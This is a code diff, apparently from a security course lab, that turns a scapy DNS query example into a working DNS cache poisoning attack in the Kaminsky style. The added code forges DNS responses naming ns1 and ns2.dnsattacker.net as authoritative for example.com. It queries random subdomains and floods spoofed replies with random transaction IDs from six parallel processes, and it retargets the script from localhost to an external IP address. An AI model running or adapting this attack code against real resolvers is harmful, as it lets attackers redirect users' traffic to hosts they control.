@@ -1,10 +1,11 @@
 #!/usr/bin/env python
 import argparse
 import socket
-
+from multiprocessing import Process
 from scapy.all import DNS, DNSQR, DNSRR
 from random import randint, choice
 from string import ascii_lowercase, digits
+from scapy.layers.dns import DNS
 
 
 parser = argparse.ArgumentParser()
@@ -15,7 +16,7 @@ parser.add_argument(
 args = parser.parse_args()
 
 # your bind's ip address
-my_ip = '127.0.0.1'
+my_ip = '128.100.8.174'
 # your bind's port (DNS queries are send to this port)
 my_port = args.dns_port
 # port that your bind uses to send its DNS queries
@@ -42,29 +43,102 @@ def sendPacket(sock, packet, ip, port):
 
     sock.sendto(str(packet), (ip, port))
 
-def SendDNSReplies():
+def SendDNSReplies(dnsPacket):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    # dnsReply = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    # sendPacket(sock, dnsPacket, my_ip, my_port)
+    sendPacket(sock, dnsPacket, my_ip, my_query_port)
+
 '''
 Example code that sends a DNS query using scapy.
 '''
-def exampleSendDNSQuery():
+def SendDNSQuery(qname):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=qname))
     sendPacket(sock, dnsPacket, my_ip, my_port)
 
-    #bind server is waiting now
-    #we should send attack packets
 
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
+def generateAttackDNSResponse(response):
+    # configuring DNS fields
+    response.an.ttl = 85063
+    response.nscount = 2
+    response.aa = response.qr
+    response.arcount = 0
+
+    if response.an != None:
+        response.an.rdata = "5.6.6.8"
+    if response.ar != None:
+        del response.ar
+    limit = max(response.nscount, 2)
+    #print limit
+    for count in xrange(limit - 1, -1 ,-1 ):
+        #print count
+        if count <= 1:
+            #print "count is less than 1"
+            if count == 0 and response.ns[0] != None:
+                response.ns[0].rdata = "ns1.dnsattacker.net"
+            if count == 0 and response.ns[0] == None:
+                response.ns[0] = response.an
+                response.ns[0].rdata = "ns1.dnsattacker.net"
+                response.ns[0].type = "NS"
+
+            if count == 1 and response.nscount > 1:
+                response.ns[1].rdata = "ns2.dnsattacker.net"
+        else:
+            del response.ns[count]
     #print response.show()
-    print "***** End of Remote Server Packet *****\n"
+    return response
 
+def attack():
 
-if __name__ == '__main__':
-    exampleSendDNSQuery()
+    # generating template DNS response from google.ca
+    exampleQname = 'google.ca'
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=exampleQname))
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+    templateDNSResponse = sock.recv(4096)
 
+    #modifying the template DNS response to the attack response
+    templateDNSResponse = DNS(templateDNSResponse)
+    attackDNSResponse = generateAttackDNSResponse(templateDNSResponse)
 
+    #define the attack target
+    attackQname = 'example.com'
+
+    #renaming the DNS component to attack target
+    attackDNSResponse.ns[0].rrname = attackQname
+    attackDNSResponse.ns[1].rrname = attackQname
+    # if attackDNSResponse.ar != None:
+    #     del attackDNSResponse.ar
+    #print attackDNSResponse.show()
+
+    while True:
+        # generating random subdomain urls
+        randomQname = getRandomSubDomain() + '.' + attackQname
+
+        #renaming the DNS component to random subdomain url
+        attackDNSResponse.qd.qname = randomQname
+        attackDNSResponse.an.rrname = randomQname
+
+        #send the query
+        SendDNSQuery(randomQname)
+        count = 0
+        while count < 100:
+            #try to send reponse with random ID to let server cache our response
+            attackDNSResponse.id=getRandomTXID()
+            SendDNSReplies(attackDNSResponse)
+            count = count + 1
+
+# creating multiple processing for attacking
+p0 = Process(target=attack)
+p1 = Process(target=attack)
+p2 = Process(target=attack)
+p3 = Process(target=attack)
+p4 = Process(target=attack)
+p5 = Process(target=attack)
+
+#starting the processes.
+p0.start()
+p1.start()
+p2.start()
+p3.start()
+p4.start()
+p5.start()
